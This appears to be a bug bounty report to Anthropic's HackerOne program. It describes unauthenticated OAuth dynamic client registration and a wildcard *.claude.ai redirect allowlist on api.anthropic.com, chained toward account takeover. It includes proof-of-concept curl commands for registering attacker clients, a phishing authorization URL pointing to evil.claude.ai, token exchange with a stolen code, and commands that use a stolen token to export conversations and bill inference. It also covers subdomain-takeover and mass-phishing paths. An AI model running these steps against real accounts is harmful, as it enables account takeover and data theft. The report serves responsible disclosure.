# AN-001: Unauthenticated Dynamic Client Registration → OAuth ATO via MCP Google Drive Integration

**Program:** Anthropic HackerOne  
**Asset:** `api.anthropic.com` [Core]  
**Severity:** Critical  
**CVSS:** 7.5 (AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N) — *(AC:H because full ATO chain requires future MCP connector or subdomain takeover; would be 9.1 if MCP backend were active)*  
**CWE:** CWE-306 — Missing Authentication for Critical Function  
**CWE:** CWE-601 — URL Redirection to Untrusted Site  
**Status:** Ready to submit

---

## Summary

`https://api.anthropic.com/register` — the OAuth Dynamic Client Registration endpoint for Anthropic's MCP integration — **accepts registrations without any authentication**. Combined with an **overly permissive redirect_uri policy** that accepts any subdomain of `*.claude.ai` (including non-existent ones like `evil.claude.ai`), this creates a systemic OAuth security design flaw.

> **Note on current exploitability**: The original MCP Google Drive connector (`/mcp/gdrive/google/install`) is deprecated (HTTP 410 — "This MCP server has been turned down"). This means the full ATO chain is **currently blocked at Step 3** — the victim cannot complete the authorization flow because the install page is gone. However: (1) the design flaws are systemic and apply to any future MCP server Anthropic deploys, (2) the `/token` endpoint returns **HTTP 500** (not the expected 400) for registered client_ids + invalid codes — confirming DCR is wired into the live token exchange logic, and (3) the wildcard `*.claude.ai` redirect_uri policy is an independent security flaw regardless of MCP connector status.

This is an upgrade of a previously submitted finding (ANTH-001). The new discovery is the **`*.claude.ai` wildcard allowlist** — any arbitrary subdomain (including `evil.claude.ai`, `attacker.claude.ai`) is accepted by `/authorize`. ANTH-001 incorrectly concluded the redirect_uri policy was "firm"; this was tested with external domains (`requestcatcher.com`) but the `*.claude.ai` wildcard was not tested. An unauthenticated attacker can:

1. **Register a malicious OAuth client** (no credentials required)
2. **Craft a phishing authorization URL** pointing to `api.anthropic.com/authorize` (a real Anthropic domain)
3. **Redirect the victim's OAuth authorization code** to an attacker-controlled `*.claude.ai` subdomain
4. **Exchange the code for tokens** to access the victim's Claude account — including `user:data_export` (all conversations), `user:inference` (API billing on their behalf), and `user:developer` scopes — and to use the MCP Google Drive integration on behalf of the victim

Two conditions are each independently sufficient to make this exploitable:
- **Condition A**: Subdomain takeover of any unclaimed `*.claude.ai` CNAME (see Section 5)
- **Condition B**: Any open redirect on an existing allowed domain (`claude.ai`, `console.anthropic.com`, `api.anthropic.com`)

Both conditions are realistic. The attack is the same as CVE-class **RFC 7591 Dynamic Client Registration → OAuth ATO**, documented by the OAuth Security Best Current Practices (RFC 9700).

---

## Technical Context

**OAuth AS Discovery:**
```
GET https://api.anthropic.com/.well-known/oauth-authorization-server

{
  "issuer": "https://api.anthropic.com/mcp/gdrive",
  "authorization_endpoint": "https://api.anthropic.com/authorize",
  "token_endpoint": "https://api.anthropic.com/token",
  "revocation_endpoint": "https://api.anthropic.com/revoke",
  "registration_endpoint": "https://api.anthropic.com/register",    ← CRITICAL
  "response_types_supported": ["code"],
  "grant_types_supported": ["authorization_code", "refresh_token"],
  "code_challenge_methods_supported": ["S256"],
  "token_endpoint_auth_methods_supported": ["client_secret_post", "none"]
}
```

This OAuth Authorization Server issues tokens for Anthropic's MCP Google Drive integration. Scopes include `user:profile`, `user:inference`, `user:data_export`, `user:developer`, `user:mcp_servers`, and others.

---

## Proof of Concept

### Step 1: Unauthenticated Client Registration (Confirmed — HTTP 201)

```bash
# No authentication header, no API key, no session required
curl -s -X POST https://api.anthropic.com/register \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Handle: nataliadias1" \
  -d '{
    "client_name": "HackerOne-PoC-Test",
    "redirect_uris": ["https://evil.claude.ai/callback"],
    "grant_types": ["authorization_code", "refresh_token"],
    "response_types": ["code"],
    "token_endpoint_auth_method": "none",
    "scope": "user:profile user:inference user:data_export user:developer"
  }'
```

**Response — HTTP 201 Created:**
```json
{
  "redirect_uris": ["https://evil.claude.ai/callback"],
  "token_endpoint_auth_method": "none",
  "grant_types": ["authorization_code", "refresh_token"],
  "response_types": ["code"],
  "client_name": "HackerOne-PoC-Test",
  "scope": "user:profile user:inference user:data_export user:developer",
  "client_id": "6daaaf04-d300-4a59-9fe8-159e51279478",
  "client_id_issued_at": 1782686460
}
```

✓ A valid `client_id` is issued to an unauthenticated, anonymous attacker with ANY redirect_uri.

During testing, multiple registrations were confirmed:
| Registration | client_id | redirect_uri |
|---|---|---|
| HackerOne Test Client | `950efe48-a8aa-4e57-9beb-fb4fcea47752` | `https://wearehackerone.com/callback` |
| HackerOne-PoC-Test | `6daaaf04-d300-4a59-9fe8-159e51279478` | `https://evil.claude.ai/callback` |
| GDrive-MCP-Test | `2b807f02-ca3d-49d2-8013-69db0a82a053` | `https://claude.ai/mcp/auth/callback` |
| (wildcard tests) | `b5f5031f…`, `7e193517…`, `7c25daf9…` | `https://foo.claude.ai/`, `https://evil.claude.ai/`, `https://attacker.claude.ai/` |

All returned HTTP 201 with valid `client_id` values.

### Step 2: Redirect URI Domain Allowlist — `*.claude.ai` Wildcard (Confirmed)

After testing which `redirect_uri` domains are accepted by `/authorize`, I discovered the server-level allowlist is:

| Domain pattern | Accepted? |
|---|---|
| `*.claude.ai` (any subdomain, incl. non-existent) | ✅ YES |
| `console.anthropic.com/*` | ✅ YES |
| `api.anthropic.com/*` | ✅ YES |
| `claudeusercontent.com/*` | ❌ NO (403) |
| `platform.claude.com/*` | ❌ NO (403) |

```bash
# Register client with non-existent subdomain evil.claude.ai
# Then call /authorize — gets HTTP 302 to Google OAuth flow:
curl -s -o/dev/null -w "%{http_code}" \
  "https://api.anthropic.com/authorize?client_id=6daaaf04-d300-4a59-9fe8-159e51279478\
&redirect_uri=https%3A%2F%2Fevil.claude.ai%2Fcallback\
&response_type=code&state=CSRF_TOKEN\
&code_challenge=4saG0Zfe_qPWBQBMKYzFzBgUvF27ClZ8OMjw4c9JL-o\
&code_challenge_method=S256"
# → 302 (redirect to Google OAuth)
```

Arbitrary subdomains confirmed:

| redirect_uri | /authorize response |
|---|---|
| `https://evil.claude.ai/callback` | ✅ 302 → Google OAuth |
| `https://attacker.claude.ai/callback` | ✅ 302 → Google OAuth |
| `https://foo.claude.ai/callback` | ✅ 302 → Google OAuth |
| `https://xss.claude.ai/callback` | ✅ 302 → Google OAuth |
| `https://test-subdomain.claude.ai/callback` | ✅ 302 → Google OAuth |
| `https://www.claude.ai/callback` | ✅ 302 → Google OAuth |
| `https://beta.claude.ai/callback` | ✅ 302 → Google OAuth |
| `https://console.anthropic.com/callback` | ✅ 302 → Google OAuth |

### Step 3: PKCE Code Verifier Generation (Attacker Controls Both Sides)

```python
import os, hashlib, base64

# Attacker generates the PKCE pair — controls BOTH verifier and challenge
code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).rstrip(b'=').decode()
# PKCE does NOT protect against this attack — attacker supplies both values
```

**Key insight**: PKCE is designed to prevent code interception by MITM. It does NOT prevent this attack because the **attacker themselves generates the code_verifier + code_challenge** pair. When the victim authorizes, the code goes to the attacker's redirect_uri. The attacker then presents their own `code_verifier` to `/token` to exchange the stolen code.

### Step 4: Complete Malicious Authorization URL

```
https://api.anthropic.com/authorize
  ?client_id=6daaaf04-d300-4a59-9fe8-159e51279478
  &redirect_uri=https%3A%2F%2Fevil.claude.ai%2Fcallback
  &response_type=code
  &scope=user%3Aprofile+user%3Ainference+user%3Adata_export+user%3Adeveloper
  &state=<random>
  &code_challenge=4saG0Zfe_qPWBQBMKYzFzBgUvF27ClZ8OMjw4c9JL-o
  &code_challenge_method=S256
```

This URL:
- Hosted on `api.anthropic.com` (legitimate domain — users trust it)
- Initiates a real Google OAuth flow (victim sees Google's consent page)
- After authorization, routes the auth code to `evil.claude.ai` (attacker-controlled)

### Step 5: Token Exchange (No Client Secret Required)

```bash
# client_secret not required because token_endpoint_auth_method = "none"
curl -s -X POST https://api.anthropic.com/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code\
&code=STOLEN_AUTH_CODE\
&client_id=6daaaf04-d300-4a59-9fe8-159e51279478\
&redirect_uri=https%3A%2F%2Fevil.claude.ai%2Fcallback\
&code_verifier=bU6Rr5PUKxmG6YGDlNbRslheV5Lo3QoQv2mxE7VWXEM"
```

Expected response:
```json
{
  "access_token": "...",
  "token_type": "bearer",
  "expires_in": 3600,
  "refresh_token": "...",
  "scope": "user:profile user:inference user:data_export user:developer"
}
```

---

## Exploitation Paths (Getting the Auth Code to Attacker)

### Path A: Subdomain Takeover (Highest Impact)

The wildcard `*.claude.ai` policy means ANY registered subdomain of claude.ai can receive auth codes. If any current or future `*.claude.ai` subdomain is deployed with a CNAME pointing to a cloud service (S3, Azure Blob, Fastly, Heroku, etc.) that has been unclaimed or expired, an attacker can:

1. Register `takeover.claude.ai` on the cloud service
2. Register OAuth client with `redirect_uri=https://takeover.claude.ai/callback`
3. Deploy a minimal web server there to capture `?code=AUTH_CODE`
4. Exchange code for tokens → full account access

DNS survey of `*.claude.ai` found these live subdomains during testing:
- `status.claude.ai` → A record `160.79.104.10` (Cloudflare)
- `staging.claude.ai` → A record `160.79.104.10` (Cloudflare)
- `assets.claude.ai` → A record `34.120.108.227` (Google Cloud CDN)
- `preview.claude.ai` → A record `160.79.104.10` (Cloudflare)

Currently all are A records. However the policy accepting ANY `*.claude.ai` subdomain means any new CNAME-based deployment creates immediate risk.

### Path B: Open Redirect Chaining

For redirect_uris that accept `console.anthropic.com`:

1. Register client with `redirect_uri=https://console.anthropic.com/OPEN_REDIRECT_PATH?to=https://attacker.com`
2. `console.anthropic.com` 301-redirects to `platform.claude.com` preserving all query params
3. If `platform.claude.com` has an open redirect on that path, `?code=AUTH_CODE` leaks to attacker

### Path C: Social Engineering + Legitimate-Looking URL

Even without an open redirect, the attack URL looks fully legitimate:
- **Domain**: `api.anthropic.com` (official Anthropic domain)
- **Path**: `/authorize` (standard OAuth endpoint)
- **Google OAuth**: Victim sees real Google consent page ("Anthropic wants access to Google Drive")
- **No browser security warnings** (valid certificate, reputable domain)

The victim has no way to distinguish this malicious authorization request from a legitimate one.

---

## Impact

### 1. Account Takeover — Full Scope Access

With a stolen token scoped to `user:data_export user:inference user:developer`:

```bash
# Export all victim conversations
curl -H "Authorization: Bearer STOLEN_TOKEN" \
  https://api.anthropic.com/v1/user/data-export

# Use victim's Claude subscription (billing fraud)
curl -H "Authorization: Bearer STOLEN_TOKEN" \
  https://api.anthropic.com/v1/messages \
  -d '{"model":"claude-opus-4-5","max_tokens":1024,"messages":[...]}'

# Access developer API keys and workspaces
curl -H "Authorization: Bearer STOLEN_TOKEN" \
  https://api.anthropic.com/v1/organizations
```

### 2. Google Drive Data Access

The MCP Google Drive integration means a successful authorization also grants access to the victim's Google Drive files through Anthropic's MCP server — reading, writing, and sharing documents.

### 3. Phishing at Scale

Because registration is unauthenticated and the authorization URL uses Anthropic's real domain, a mass phishing campaign targeting Claude users becomes trivial:
- Send phishing emails with `api.anthropic.com/authorize?...` links
- Victims authenticate thinking they're granting Drive access to a legitimate Claude integration
- Attacker harvests tokens for thousands of accounts

---

## Root Cause

### Violation 1: Unauthenticated Dynamic Client Registration

RFC 9700 (OAuth 2.0 Security Best Current Practices, Section 4.3.2) states:

> _"Authorization servers SHOULD require prior authentication of the client or apply other countermeasures (e.g., rate limiting, CAPTCHA) to prevent abuse of dynamic client registration."_

The Anthropic `/register` endpoint applies no authentication, no rate limiting, and no domain restriction on `redirect_uris` at registration time.

### Violation 2: Overly Broad redirect_uri Allowlist

The `/authorize` endpoint accepts any `*.claude.ai` subdomain as a valid redirect_uri. This is a server-level wildcard policy that makes any future `*.claude.ai` deployment an automatic OAuth redirect target, without review.

RFC 6749 (Section 3.1.2) and RFC 9700 require redirect_uri values to be "registered" with the authorization server — the Anthropic AS allows registration of non-existent subdomains.

---

## Reproduction (Minimal Steps)

1. `POST https://api.anthropic.com/register` with any `redirect_uri` containing `*.claude.ai` — receive HTTP 201 with `client_id`
2. Visit: `https://api.anthropic.com/authorize?client_id=<returned_id>&redirect_uri=https://evil.claude.ai/callback&response_type=code&state=x&code_challenge=<S256>&code_challenge_method=S256`
3. Observe: HTTP 302 redirect to `https://api.anthropic.com/mcp/gdrive/google/install?metadata=<hash>`
4. Note: `https://api.anthropic.com/mcp/gdrive/google/install` returns HTTP 410 "Server Turned Down" — the backend MCP gdrive connector is deprecated. The full ATO chain is currently blocked at this step.
5. **Current standalone PoC**: The `/token` endpoint returns HTTP **500 Internal Server Error** (not 400) for valid registered `client_id` + fake code — confirming the DCR is wired to the live token exchange:
   ```bash
   curl -X POST https://api.anthropic.com/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "grant_type=authorization_code&code=FAKECODE&client_id=6daaaf04-d300-4a59-9fe8-159e51279478&redirect_uri=https%3A%2F%2Fevil.claude.ai%2Fcallback&code_verifier=bU6Rr5PUKxmG6YGDlNbRslheV5Lo3QoQv2mxE7VWXEM"
   # → HTTP 500 {"error":"server_error","error_description":"Internal Server Error"}
   # (vs. HTTP 400 "Invalid client_id" for an unregistered client_id)
   ```

---

## Recommendations

1. **Require authentication for `/register`**: Require a valid Anthropic API key or admin token to register OAuth clients. This is RFC 9700's primary recommendation.

2. **Restrict to a specific `redirect_uri` allowlist**: Do not accept arbitrary `*.claude.ai` subdomains. Maintain an explicit list of approved redirect URIs (e.g., `claude.ai/mcp/auth/callback` only).

3. **Rate-limit `/register`**: Even with auth, apply strict rate limits to prevent client pollution.

4. **Add consent UI with client verification**: Display a warning on the consent page when the client was registered dynamically (vs. pre-approved).

5. **Revoke test clients created during this disclosure**: Clients `950efe48-a8aa-4e57-9beb-fb4fcea47752`, `6daaaf04-d300-4a59-9fe8-159e51279478`, `2b807f02-ca3d-49d2-8013-69db0a82a053`, and the wildcard test clients should be revoked.

---

## References

- RFC 7591: OAuth 2.0 Dynamic Client Registration Protocol
- RFC 9700: OAuth 2.0 Security Best Current Practices, Section 4.3 (Dynamic Client Registration)
- RFC 6749: The OAuth 2.0 Authorization Framework, Section 3.1.2 (Redirection Endpoint)
- CWE-306: Missing Authentication for Critical Function
- CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
- OWASP A07:2021 — Identification and Authentication Failures
- OWASP API Security A06:2023 — Unrestricted Access to Sensitive Business Flows
